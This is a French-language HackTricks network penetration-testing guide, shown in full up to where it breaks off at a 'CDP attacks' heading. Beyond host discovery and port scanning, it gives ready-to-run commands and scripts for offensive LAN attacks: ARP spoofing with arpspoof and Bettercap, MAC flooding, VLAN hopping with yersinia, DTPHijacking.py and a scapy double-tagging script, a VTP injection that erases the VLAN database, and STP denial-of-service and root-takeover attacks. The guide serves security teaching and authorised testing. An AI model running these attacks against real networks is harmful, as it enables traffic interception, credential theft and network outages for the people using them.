# Pentesting Network

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce de bug bounty** : **inscrivez-vous** sur **Intigriti**, une plateforme premium de **bug bounty cr√©√©e par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) d√®s aujourd'hui et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

## D√©couverte des h√¥tes depuis l'ext√©rieur

Il s'agit d'une **section br√®ve** sur la fa√ßon de trouver les **adresses IP qui r√©pondent** depuis **Internet**.\
Dans cette situation, vous avez une **plage d'adresses IP** (peut-√™tre m√™me plusieurs **plages**) et vous voulez simplement trouver **les adresses IP qui r√©pondent**.

### ICMP

C'est le moyen le plus **facile** et le plus **rapide** de d√©couvrir si un h√¥te est actif ou non.\
Vous pouvez essayer d'envoyer des paquets **ICMP** et **attendre des r√©ponses**. Le moyen le plus simple est d'envoyer une **demande d'√©cho** et d'attendre la r√©ponse. Vous pouvez le faire en utilisant une simple commande `ping` ou en utilisant `fping` pour les **plages d'adresses**.\
Vous pouvez √©galement utiliser **nmap** pour envoyer d'autres types de paquets ICMP (cela √©vitera les filtres pour les demandes-r√©ponses d'√©cho ICMP courantes).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PEPM -sP -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### D√©couverte des ports TCP

Il est tr√®s courant de constater que tous les types de paquets ICMP sont filtr√©s. Dans ce cas, tout ce que vous pouvez faire pour v√©rifier si un h√¥te est actif est de **chercher des ports ouverts**. Chaque h√¥te poss√®de **65535 ports**, donc si vous avez un "grand" p√©rim√®tre, vous ne pouvez pas tester si **chaque port** de chaque h√¥te est ouvert ou non, cela prendrait trop de temps.\
Ce dont vous avez besoin, c'est d'un **scan de ports rapide** ([masscan](https://github.com/robertdavidgraham/masscan)) et d'une liste des **ports les plus utilis√©s :**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Vous pouvez √©galement effectuer cette √©tape avec `nmap`, mais c'est plus lent et `nmap` a parfois des probl√®mes pour identifier les h√¥tes actifs.

### D√©couverte des ports HTTP

Il s'agit simplement d'une d√©couverte des ports TCP utile lorsque vous souhaitez **vous concentrer sur la d√©couverte de services HTTP** :
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### D√©couverte de port UDP

Vous pouvez √©galement essayer de v√©rifier si certains **ports UDP sont ouverts** pour d√©cider si vous devez **accorder plus d'attention** √† un **h√¥te**. Comme les services UDP ne **r√©pondent g√©n√©ralement pas** avec **des donn√©es** √† un paquet de sondage UDP vide, il est difficile de dire si un port est filtr√© ou ouvert. La mani√®re la plus simple de le d√©terminer est d'envoyer un paquet li√© au service en cours d'ex√©cution, et comme vous ne savez pas quel service est en cours d'ex√©cution, vous devriez essayer celui qui est le plus probable en fonction du num√©ro de port :
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La ligne nmap propos√©e pr√©c√©demment testera les **1000 ports UDP les plus courants** sur chaque h√¥te dans la plage **/24**, mais cela prendra plus de **20 minutes**. Si vous avez besoin de **r√©sultats plus rapides**, vous pouvez utiliser [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) : `./udp-proto-scanner.pl 199.66.11.53/24`. Cela enverra ces **sondages UDP** sur leur **port attendu** (pour une plage /24, cela ne prendra qu'une minute) : _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### D√©couverte des ports SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Ici, vous pouvez trouver un guide complet de toutes les attaques Wifi bien connues au moment de la r√©daction :

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## D√©couverte des h√¥tes depuis l'int√©rieur

Si vous √™tes √† l'int√©rieur du r√©seau, l'une des premi√®res choses que vous voudrez faire est de **d√©couvrir les autres h√¥tes**. Selon **le niveau de bruit** que vous pouvez/voulez g√©n√©rer, diff√©rentes actions peuvent √™tre effectu√©es :

### Passif

Vous pouvez utiliser ces outils pour d√©couvrir passivement les h√¥tes √† l'int√©rieur d'un r√©seau connect√© :
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Actif

Notez que les techniques comment√©es dans [_**D√©couverte des h√¥tes depuis l'ext√©rieur**_](./#d√©couverte-des-h√¥tes-depuis-l'ext√©rieur) (_D√©couverte des ports TCP/HTTP/UDP/SCTP_) peuvent √©galement √™tre **appliqu√©es ici**.\
Cependant, √©tant donn√© que vous √™tes dans le **m√™me r√©seau** que les autres h√¥tes, vous pouvez faire **plus de choses**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ICMP actif

Notez que les techniques comment√©es dans _D√©couverte des h√¥tes depuis l'ext√©rieur_ ([_**ICMP**_](./#icmp)) peuvent √©galement √™tre **appliqu√©es ici**.\
Mais, √©tant donn√© que vous √™tes dans le **m√™me r√©seau** que les autres h√¥tes, vous pouvez faire **plus de choses** :

* Si vous **pinguez** une **adresse de diffusion de sous-r√©seau**, le ping devrait arriver √† **chaque h√¥te** et ils pourraient vous **r√©pondre** : `ping -b 10.10.5.255`
* En pingant l'**adresse de diffusion du r√©seau**, vous pourriez m√™me trouver des h√¥tes √† l'int√©rieur d'**autres sous-r√©seaux** : `ping -b 255.255.255.255`
* Utilisez l'option `-PEPM` de `nmap` pour effectuer une d√©couverte d'h√¥te en envoyant des demandes **ICMPv4 echo**, **timestamp** et **masque de sous-r√©seau** : `nmap -PEPM -sP ‚Äìvvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan est utilis√© pour **allumer** les ordinateurs via un **message r√©seau**. Le paquet magique utilis√© pour allumer l'ordinateur est simplement un paquet o√π un **MAC Dst** est fourni et est ensuite **r√©p√©t√© 16 fois** √† l'int√©rieur du m√™me paquet.\
Ces types de paquets sont g√©n√©ralement envoy√©s dans un **ethernet 0x0842** ou dans un **paquet UDP sur le port 9**.\
Si **aucun \[MAC]** n'est fourni, le paquet est envoy√© en **broadcast ethernet** (et le MAC de diffusion sera celui qui est r√©p√©t√©).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Analyse des h√¥tes

Une fois que vous avez d√©couvert toutes les adresses IP (externes ou internes) que vous souhaitez analyser en profondeur, diff√©rentes actions peuvent √™tre effectu√©es.

### TCP

* Port **ouvert** : _SYN --> SYN/ACK --> RST_
* Port **ferm√©** : _SYN --> RST/ACK_
* Port **filtr√©** : _SYN --> \[PAS DE R√âPONSE]_
* Port **filtr√©** : _SYN --> message ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Il existe 2 options pour scanner un port UDP :

* Envoyer un **paquet UDP** et v√©rifier la r√©ponse _**ICMP unreachable**_ si le port est **ferm√©** (dans plusieurs cas, ICMP sera **filtr√©** et vous ne recevrez aucune information si le port est ferm√© ou ouvert).
* Envoyer des **datagrammes format√©s** pour obtenir une r√©ponse d'un **service** (par exemple, DNS, DHCP, TFTP et autres, comme indiqu√© dans _nmap-payloads_). Si vous recevez une **r√©ponse**, alors le port est **ouvert**.

**Nmap** va **m√©langer les deux** options en utilisant "-sV" (les scans UDP sont tr√®s lents), mais notez que les scans UDP sont plus lents que les scans TCP :
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Analyse SCTP

SCTP fonctionne aux c√¥t√©s de TCP et UDP. Destin√© √† fournir le **transport** des donn√©es de **t√©l√©phonie** sur **IP**, le protocole duplique de nombreuses fonctionnalit√©s de fiabilit√© du syst√®me de signalisation 7 (SS7) et constitue la base d'une famille de protocoles plus large connue sous le nom de SIGTRAN. SCTP est pris en charge par des syst√®mes d'exploitation tels que IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS et VxWorks.

Deux analyses diff√©rentes pour SCTP sont propos√©es par nmap : _-sY_ et _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### √âvasion des IDS et IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Plus d'options nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### R√©v√©lation des adresses IP internes

Les routeurs, pare-feu et dispositifs r√©seau mal configur√©s **r√©pondent parfois** aux sondes r√©seau **en utilisant des adresses source non publiques**. Vous pouvez utiliser _tcpdump_ pour **identifier les paquets** re√ßus √† partir d'**adresses priv√©es** lors des tests. Dans ce cas, l'interface _eth2_ de Kali Linux est **adressable** depuis l'**Internet public** (Si vous √™tes **derri√®re** un **NAT** d'un **pare-feu**, ce type de paquets sera probablement **filtr√©**).
```bash
tcpdump ‚Äìnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

En sniffant, vous pouvez obtenir des d√©tails sur les plages d'adresses IP, les tailles de sous-r√©seau, les adresses MAC et les noms d'h√¥tes en examinant les trames et les paquets captur√©s. Si le r√©seau est mal configur√© ou si le tissu de commutation est sous pression, les attaquants peuvent capturer du mat√©riel sensible via le sniffing passif du r√©seau.

Si un r√©seau Ethernet commut√© est correctement configur√©, vous ne verrez que des trames de diffusion et du mat√©riel destin√© √† votre adresse MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
On peut √©galement capturer des paquets √† partir d'une machine distante via une session SSH avec Wireshark en tant qu'interface graphique en temps r√©el.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

Bettercap est un outil de piratage r√©seau puissant et polyvalent utilis√© pour effectuer des tests de p√©n√©tration et des attaques sur les r√©seaux. Il est con√ßu pour √™tre utilis√© par les professionnels de la s√©curit√© pour √©valuer la s√©curit√© des r√©seaux et des syst√®mes.

Bettercap offre une large gamme de fonctionnalit√©s, notamment la capture de paquets, l'analyse de protocoles, l'injection de paquets, la redirection de trafic, l'interception de sessions, la falsification d'adresses MAC, la d√©tection d'intrusion et bien plus encore. Il prend en charge diff√©rents types d'attaques, tels que le d√©tournement de session, le phishing, le d√©ni de service, l'empoisonnement ARP, etc.

L'outil est bas√© sur le langage de programmation Go et est disponible pour les syst√®mes d'exploitation Linux et macOS. Il est facile √† installer et √† utiliser, offrant une interface en ligne de commande conviviale.

Bettercap est un outil extr√™mement puissant, mais il est important de noter qu'il doit √™tre utilis√© de mani√®re √©thique et l√©gale, avec le consentement appropri√© des propri√©taires des r√©seaux et des syst√®mes. L'utilisation de Bettercap sans autorisation peut entra√Æner des cons√©quences l√©gales graves.
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

√âvidemment.

### Capture des identifiants

Vous pouvez utiliser des outils comme [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) pour extraire les identifiants √† partir d'un fichier pcap ou d'une interface en direct.

## Attaques LAN

### ARP spoofing

Le spoofing ARP consiste √† envoyer des r√©ponses ARP gratuites pour indiquer que l'adresse IP d'une machine correspond √† l'adresse MAC de notre appareil. Ensuite, la victime modifiera la table ARP et contactera notre machine chaque fois qu'elle voudra contacter l'adresse IP usurp√©e.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**

L'outil **arpspoof** est utilis√© pour mener des attaques d'empoisonnement ARP dans le cadre d'un test de p√©n√©tration r√©seau. L'empoisonnement ARP consiste √† envoyer de fausses informations ARP √† des h√¥tes cibles, ce qui les am√®ne √† associer une adresse IP √† une adresse MAC incorrecte. Cela permet √† l'attaquant de rediriger le trafic r√©seau vers sa propre machine, ce qui lui permet de capturer et d'analyser le trafic.

Pour utiliser **arpspoof**, vous devez d'abord activer le transfert de paquets sur votre machine. Cela peut √™tre fait en ex√©cutant la commande suivante :

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Ensuite, vous pouvez ex√©cuter la commande suivante pour lancer l'attaque d'empoisonnement ARP :

```
arpspoof -i <interface> -t <cible> <routeur>
```

Remplacez `<interface>` par l'interface r√©seau que vous souhaitez utiliser, `<cible>` par l'adresse IP de la machine cible et `<routeur>` par l'adresse IP du routeur par d√©faut.

Lorsque l'attaque est en cours, vous pouvez utiliser des outils tels que Wireshark pour capturer et analyser le trafic r√©seau. Assurez-vous de prendre les mesures appropri√©es pour vous prot√©ger contre les fuites de donn√©es et les cons√©quences potentielles de cette attaque.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - D√©bordement de la table CAM

D√©bordez la table CAM du commutateur en envoyant de nombreux paquets avec diff√©rentes adresses MAC source. Lorsque la table CAM est pleine, le commutateur se comporte comme un concentrateur (diffusant tout le trafic).
```bash
macof -i <interface>
```
Dans les commutateurs modernes, cette vuln√©rabilit√© a √©t√© corrig√©e.

### Attaques VLAN / DTP 802.1Q

#### Trunking dynamique

**DTP (Dynamic Trunking Protocol)** est un protocole de couche liaison con√ßu pour fournir un syst√®me de trunking automatique. Avec DTP, les commutateurs d√©cident quel port fonctionnera en mode trunk (Trunk) et lequel ne le fera pas. L'utilisation de **DTP** indique une **mauvaise conception du r√©seau**. Les trunks devraient √™tre strictement l√† o√π ils sont n√©cessaires et cela devrait √™tre document√©.

**Par d√©faut, tous les ports du commutateur fonctionnent en mode Dynamic Auto.** Cela indique que le port du commutateur est en mode d'initialisation du trunk √† partir du commutateur voisin. **Le Pentester doit se connecter physiquement au commutateur et envoyer une trame DTP Desirable**, ce qui d√©clenche le passage du port en mode trunk. L'attaquant peut ensuite √©num√©rer les VLAN en utilisant l'analyse des trames STP et contourner la segmentation des VLAN en cr√©ant des interfaces virtuelles.

De nombreux commutateurs prennent en charge le protocole Dynamic Trunking (DTP) par d√©faut, ce qui permet √† un adversaire de **√©muler un commutateur et de recevoir du trafic sur tous les VLAN**. L'outil [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) peut renifler une interface et **indiquer si le commutateur est en mode par d√©faut, trunk, dynamique, auto ou access** (c'est le seul qui √©viterait le VLAN hopping). L'outil indiquera si le commutateur est vuln√©rable ou non.

Si l'on d√©couvre que le r√©seau est vuln√©rable, vous pouvez utiliser _**Yersinia**_ pour lancer une "**activation du trunk**" en utilisant le protocole "**DTP**" et vous pourrez voir les paquets r√©seau de tous les VLAN.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

Pour √©num√©rer les VLAN, il est √©galement possible de g√©n√©rer le cadre DTP Desirable avec le script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. Ne pas interrompre le script sous aucun pr√©texte. Il injecte DTP Desirable toutes les trois secondes. **Les canaux de trunk cr√©√©s dynamiquement sur le commutateur ne restent actifs que pendant cinq minutes. Apr√®s cinq minutes, le trunk se d√©sactive.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Je tiens √† souligner que **Access/Desirable (0x03)** indique que la trame DTP est de type "Desirable", ce qui indique au port de passer en mode Trunk. Et **802.1Q/802.1Q (0xa5)** indique le type d'encapsulation **802.1Q**.

En analysant les trames STP, **nous d√©couvrons l'existence des VLAN 30 et 60**.

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Attaquer des VLAN sp√©cifiques

Une fois que vous connaissez les identifiants VLAN et les valeurs IP, vous pouvez **configurer une interface virtuelle pour attaquer un VLAN sp√©cifique**.\
Si DHCP n'est pas disponible, utilisez _ifconfig_ pour d√©finir une adresse IP statique.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Saut automatique de VLAN

L'attaque discut√©e de **Dynamic Trunking et la cr√©ation d'interfaces virtuelles pour d√©couvrir les h√¥tes √† l'int√©rieur d'autres VLAN** est **automatiquement r√©alis√©e** par l'outil : [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double √©tiquetage

Si un attaquant conna√Æt la valeur de **l'adresse MAC, de l'adresse IP et de l'ID VLAN de l'h√¥te victime**, il peut essayer de **double √©tiqueter une trame** avec son VLAN d√©sign√© et le VLAN de la victime, puis envoyer un paquet. Comme la **victime ne pourra pas se connecter** √† l'attaquant, la **meilleure option pour l'attaquant est de communiquer via UDP** avec des protocoles capables d'effectuer des actions int√©ressantes (comme SNMP).

Une autre option pour l'attaquant est de lancer un **scan de ports TCP en usurpant une adresse IP contr√¥l√©e par l'attaquant et accessible par la victime** (probablement via internet). Ensuite, l'attaquant peut √©couter sur le deuxi√®me h√¥te qu'il poss√®de pour voir s'il re√ßoit des paquets de la victime.

![](<../../.gitbook/assets/image (635) (1).png>)

Pour effectuer cette attaque, vous pouvez utiliser scapy : `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Contournement de la segmentation VLAN lat√©rale <a href="#d679" id="d679"></a>

Si vous avez **acc√®s √† un commutateur auquel vous √™tes directement connect√©**, vous avez la possibilit√© de **contourner la segmentation VLAN** au sein du r√©seau. Il vous suffit de **passer le port en mode trunk** (√©galement appel√© trunk), de cr√©er des interfaces virtuelles avec les identifiants des VLAN cibles et de configurer une adresse IP. Vous pouvez essayer de demander l'adresse de mani√®re dynamique (DHCP) ou la configurer de mani√®re statique. Cela d√©pend du cas.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Contournement de VLAN priv√© de couche 3

Dans les r√©seaux sans fil pour invit√©s et autres environnements, les param√®tres de VLAN priv√© (√©galement appel√© _isolation de port_) sont utilis√©s pour **emp√™cher les pairs d'interagir** (c'est-√†-dire que les clients **se connectent √† un point d'acc√®s sans fil mais ne peuvent pas se communiquer entre eux**). Selon les ACL r√©seau (ou leur absence), il est peut-√™tre possible d'envoyer des paquets IP √† un routeur, qui les renvoie ensuite √† un pair voisin.

Cette attaque envoie un **paquet sp√©cialement con√ßu √† l'adresse IP d'un client mais avec l'adresse MAC du routeur**. Ensuite, le **routeur redirigera le paquet vers le client**. Comme dans les _attaques √† double √©tiquetage_, vous pouvez exploiter cette vuln√©rabilit√© en contr√¥lant un h√¥te accessible par la victime.

### Attaques VTP

**VTP (VLAN Trunking Protocol)** est un protocole con√ßu pour g√©rer de mani√®re centralis√©e les VLAN. Pour suivre la base de donn√©es VLAN actuelle, les commutateurs v√©rifient des num√©ros de r√©vision sp√©ciaux. Lorsqu'une mise √† jour de la table se produit, le num√©ro de r√©vision est incr√©ment√© de un. Et si un commutateur d√©tecte une configuration avec un num√©ro de r√©vision sup√©rieur, il mettra automatiquement √† jour sa base de donn√©es VLAN.

#### R√¥les dans un domaine VTP <a href="#ebfc" id="ebfc"></a>

* **Serveur VTP.** Un commutateur dans le r√¥le de serveur VTP peut cr√©er de nouveaux VLAN, supprimer les anciens ou modifier les informations dans les VLAN eux-m√™mes. **Il g√©n√®re √©galement des annonces VTP pour les autres membres du domaine.**
* **Client VTP.** Un commutateur dans ce r√¥le recevra des annonces VTP sp√©cifiques d'autres commutateurs du domaine pour mettre √† jour les bases de donn√©es VLAN sur le sien. Les clients sont limit√©s dans leur capacit√© √† cr√©er des VLAN et ne sont m√™me pas autoris√©s √† modifier la configuration VLAN localement. En d'autres termes, **acc√®s en lecture seule.**
* **Transparent VTP.** Dans ce mode, le commutateur ne participe pas aux processus VTP et peut administrer localement et compl√®tement la configuration VLAN enti√®re. Lorsqu'il fonctionne en mode transparent, les commutateurs ne transmettent que les annonces VTP d'autres commutateurs sans affecter leur configuration VLAN. **Ces commutateurs auront toujours un num√©ro de r√©vision de z√©ro et ne peuvent pas √™tre attaqu√©s.**

#### Types d'annonces <a href="#b384" id="b384"></a>

* **Annonce de r√©sum√© ‚Äî** l'annonce VTP que le serveur VTP envoie toutes les **300 secondes (5 minutes).** Cette annonce contient le nom de domaine VTP, la version du protocole, l'horodatage et la valeur de hachage de configuration MD5.
* **Annonce partielle ‚Äî** il s'agit de l'annonce VTP qui est envoy√©e chaque fois qu'un changement de configuration VLAN se produit.
* **Demande d'annonce ‚Äî** est une demande du client VTP au serveur VTP pour un message d'annonce de r√©sum√©. G√©n√©ralement envoy√©e en r√©ponse √† un message indiquant qu'un commutateur a d√©tect√© une annonce de r√©sum√© avec un num√©ro de r√©vision de configuration sup√©rieur.

VTP ne peut √™tre attaqu√© que depuis un port trunk, car les annonces VTP sont uniquement diffus√©es et re√ßues sur les ports trunk. Par cons√©quent, lorsque vous effectuez un test d'intrusion apr√®s avoir attaqu√© DTP, votre prochaine cible pourrait √™tre VTP. Pour attaquer le domaine VTP, vous pouvez utiliser Yersinia pour ex√©cuter une injection VTP qui effacera l'ensemble de la base de donn√©es VLAN et paralysera ainsi le r√©seau.

{% hint style="info" %}
Le protocole VTP comporte jusqu'√† **trois versions**. Dans cet article, l'attaque concerne la premi√®re version, VTPv1.
{% endhint %}
```bash
yersinia -G #For graphic mode
```
Pour effacer l'int√©gralit√© de la base de donn√©es VLAN, s√©lectionnez l'option **supprimer tous les VLAN VTP**.

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### Attaques STP

**Si vous ne pouvez pas capturer les trames BPDU sur vos interfaces, il est peu probable que vous r√©ussissiez une attaque STP.**

#### **STP BPDU DoS**

En envoyant beaucoup de BPDUs TCP (Notification de changement de topologie) ou Conf (les BPDUs envoy√©s lors de la cr√©ation de la topologie), les commutateurs sont surcharg√©s et cessent de fonctionner correctement.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Attaque STP TCP**

Lorsqu'un paquet TCP est envoy√©, la table CAM des commutateurs est supprim√©e au bout de 15 secondes. Ensuite, si vous envoyez continuellement ce type de paquets, la table CAM sera red√©marr√©e en continu (ou toutes les 15 secondes) et lorsque cela se produit, le commutateur se comporte comme un concentrateur.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Attaque de la racine STP**

L'attaquant simule le comportement d'un commutateur pour devenir la racine STP du r√©seau. Ensuite, plus de donn√©es passeront par lui. Cela est int√©ressant lorsque vous √™tes connect√© √† deux commutateurs diff√©rents.\
Cela est r√©alis√© en envoyant des paquets CONF BPDUs indiquant que la valeur de **priorit√©** est inf√©rieure √† la priorit√© r√©elle du commutateur racine actuel.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si l'attaquant est connect√© √† 2 commutateurs, il peut devenir la racine de l'arbre et tout le trafic entre ces commutateurs passera par lui** (une attaque MITM sera effectu√©e).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Attaques CDP

